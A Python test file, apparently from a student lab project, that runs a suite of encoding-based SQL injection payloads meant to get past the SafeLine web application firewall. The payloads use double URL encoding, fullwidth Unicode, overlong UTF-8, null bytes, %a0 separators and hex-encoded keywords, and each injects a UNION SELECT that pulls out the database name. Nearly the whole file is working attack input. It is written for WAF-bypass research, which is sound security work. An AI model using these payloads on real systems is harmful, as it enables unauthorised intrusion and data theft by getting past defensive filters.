"""
bypass_lab/test_encoding.py
============================
Encoding-based bypasses — exploit how Safeline normalizes/decodes
input vs how MySQL/PHP decodes it.
"""
import sys
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from bypass_lab.verify import run_suite

MARKERS = "%27SEQSQLI_START%27,%27SEQSQLI_END%27"
M2 = "'SEQSQLI_START','SEQSQLI_END'"

cases = [
    # --- Double URL encoding ---
    # WAF decodes once (%2527 -> %27 -> '), backend decodes twice
    ("double-encode quote",
     "-1%2527 UNION SELECT database(),{M}-- -".format(M=MARKERS)),
    ("double-encode space+union",
     "-1%2527%2520UNION%2520SELECT%2520database(),{M}--%2520-".format(M=MARKERS)),

    # --- Unicode normalization attacks ---
    # Fullwidth characters (U+FF21-FF3A) that some parsers normalize to ASCII
    ("-1' ＵＮＩＯＮ ＳＥＬＥＣＴ (fullwidth)",
     "-1' ＵＮＩＯＮ ＳＥＬＥＣＴ database(),{M}-- -".format(M=M2)),

    # --- Mixed case + encoding combos ---
    ("url-encode U in UNION",
     "-1' %55NION SELECT database(),{M}-- -".format(M=M2)),
    ("url-encode all keywords",
     "-1' %55%4e%49%4f%4e %53%45%4c%45%43%54 database(),{M}-- -".format(M=M2)),

    # --- Overlong UTF-8 encoding (rare) ---
    # Some parsers accept overlong encoding; MySQL rejects but WAF might normalize
    ("overlong quote attempt",
     "-1%c0%a7 UNION SELECT database(),{M}-- -".format(M=M2)),

    # --- HTML entity injection (in form fields) ---
    ("html entity amp in param",
     "-1' UNION SELECT database(),'SEQSQLI&amp;START','SEQSQLI_END'-- -"),

    # --- Null byte injection positions ---
    ("null in union keyword",
     "-1' UNI\x00ON SELECT database(),{M}-- -".format(M=M2)),
    ("null before select",
     "-1' UNION \x00SELECT database(),{M}-- -".format(M=M2)),

    # --- Latin-1 specific bytes that MySQL treats as whitespace ---
    ("%a0 keyword separator",
     "-1'%a0UNION%a0SELECT%a0database(),{M}--%a0-".format(M=M2)),
    ("%a0 with null terminator",
     "-1'%a0UNION%a0SELECT%a0database(),{M};%00".format(M=M2)),

    # --- Mixed encoding in identifier ---
    ("hex-encoded identifier chars",
     "-1' UNION SELECT %64atabase(),{M}-- -".format(M=M2)),

    # --- UTF-16 / alternate charset tricks ---
    ("charset conversion SQL",
     "-1' UNION SELECT CONVERT(database() USING utf8),{M}-- -".format(M=M2)),
    ("COLLATE clause",
     "-1' UNION SELECT database() COLLATE utf8_general_ci,{M}-- -".format(M=M2)),
]

if __name__ == "__main__":
    run_suite("Encoding-Based Bypass", cases)
